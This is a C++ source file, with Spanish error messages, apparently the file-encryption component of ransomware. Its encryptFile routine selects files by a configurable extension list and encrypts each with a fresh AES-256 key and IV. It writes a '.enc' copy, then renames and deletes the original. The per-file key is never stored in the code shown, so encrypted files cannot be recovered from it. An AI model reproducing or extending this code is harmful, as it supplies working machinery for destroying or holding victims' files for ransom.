#include "AESEncryptor.hpp"
#include <openssl/err.h>
#include <fstream>
#include <iterator>

void AESEncryptor::setKey(const std::vector<unsigned char> &key,
                          const std::vector<unsigned char> &iv)
{
    if (key.size() != Constants::Encryption::AES_KEY_SIZE / 8)
    {
        throw std::runtime_error("Tamaño de clave AES inválido");
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr,
                           key.data(), iv.data()) != 1)
    {
        throw std::runtime_error("Error al inicializar cifrado AES");
    }
    keySet = true;
}

bool AESEncryptor::encryptFile(const std::string &filePath)
{
    if (!checkFileExtension(filePath))
        return false;

    try
    {

        auto key = KeyGenerator::generateAESKey();
        auto iv = KeyGenerator::generateSecureIV();
        this->setKey(key, iv);

        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile)
            throw std::runtime_error("No se pudo abrir archivo de entrada");

        std::vector<unsigned char> plaintext(
            (std::istreambuf_iterator<char>(inFile)),
            std::istreambuf_iterator<char>());
        inFile.close();

        std::vector<unsigned char> ciphertext(plaintext.size() + EVP_CIPHER_block_size(EVP_aes_256_cbc()));
        int len;

        if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len,
                              plaintext.data(), plaintext.size()) != 1)
        {
            throw std::runtime_error("Error durante cifrado");
        }

        int finalLen;
        if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &finalLen) != 1)
        {
            throw std::runtime_error("Error al finalizar cifrado");
        }
        ciphertext.resize(len + finalLen);

        std::ofstream outFile(filePath + ".enc", std::ios::binary);
        if (!outFile)
            throw std::runtime_error("No se pudo crear archivo cifrado");

        outFile.write(reinterpret_cast<const char *>(ciphertext.data()), ciphertext.size());
        outFile.close();

        renameFile(filePath);
        std::remove(filePath.c_str());

        return true;
    }
    catch (const std::exception &e)
    {
        ERR_print_errors_fp(stderr);
        return false;
    }
}

bool AESEncryptor::decryptFile(const std::string &filePath,
                               const std::vector<unsigned char> &key,
                               const std::vector<unsigned char> &iv)
{
    if (!filePath.ends_with(Constants::Encryption::ENCRYPTED_EXTENSION))
    {
        return false;
    }

    try
    {

        this->setKey(key, iv);

        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile)
            throw std::runtime_error("No se pudo abrir archivo cifrado");

        std::vector<unsigned char> ciphertext(
            (std::istreambuf_iterator<char>(inFile)),
            std::istreambuf_iterator<char>());
        inFile.close();

        EVP_CIPHER_CTX *decryptCtx = EVP_CIPHER_CTX_new();
        if (!decryptCtx)
            throw std::runtime_error("Error al crear contexto de descifrado");

        if (EVP_DecryptInit_ex(decryptCtx, EVP_aes_256_cbc(), nullptr,
                               key.data(), iv.data()) != 1)
        {
            EVP_CIPHER_CTX_free(decryptCtx);
            throw std::runtime_error("Error al inicializar descifrado");
        }

        std::vector<unsigned char> plaintext(ciphertext.size());
        int len;

        if (EVP_DecryptUpdate(decryptCtx, plaintext.data(), &len,
                              ciphertext.data(), ciphertext.size()) != 1)
        {
            EVP_CIPHER_CTX_free(decryptCtx);
            throw std::runtime_error("Error durante descifrado");
        }

        int finalLen;
        if (EVP_DecryptFinal_ex(decryptCtx, plaintext.data() + len, &finalLen) != 1)
        {
            EVP_CIPHER_CTX_free(decryptCtx);
            throw std::runtime_error("Error al finalizar descifrado");
        }
        plaintext.resize(len + finalLen);
        EVP_CIPHER_CTX_free(decryptCtx);

        std::string originalPath = filePath.substr(0, filePath.size() -
                                                          Constants::Encryption::ENCRYPTED_EXTENSION.size());

        std::ofstream outFile(originalPath, std::ios::binary);
        if (!outFile)
            throw std::runtime_error("No se pudo crear archivo descifrado");

        outFile.write(reinterpret_cast<const char *>(plaintext.data()), plaintext.size());
        outFile.close();

        return true;
    }
    catch (const std::exception &e)
    {
        ERR_print_errors_fp(stderr);
        return false;
    }
}

void AESEncryptor::setTargetExtensions(const std::vector<std::string> &extensions)
{
    targetExtensions = extensions;
}

void AESEncryptor::setEncryptionAlgorithm(const std::string &algorithm)
{
    if (algorithm != Constants::Encryption::AES_ALGORITHM)
    {
        throw std::runtime_error("Algoritmo de cifrado no soportado");
    }
    encryptionAlgorithm = algorithm;
}